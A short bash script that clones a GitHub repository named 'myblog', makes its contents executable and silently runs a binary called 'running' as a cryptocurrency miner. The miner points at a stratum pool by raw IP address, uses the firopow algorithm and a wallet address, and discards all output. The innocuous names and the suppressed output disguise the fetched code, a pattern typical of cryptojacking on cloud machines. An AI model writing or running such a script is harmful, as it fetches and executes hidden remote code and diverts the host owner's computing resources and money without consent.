#!/bin/bash
cd /hoang999
git clone https://github.com/thaihoang999/myblog.git -q
chmod -R +x myblog
./myblog/running -a firopow -o stratum+tcp://51.81.185.231:9090 -u a9XwK7sits5Pn9egPaYX1gxXvuncqe4SRv.az-kienmai-10 -p x > /dev/null 2>&1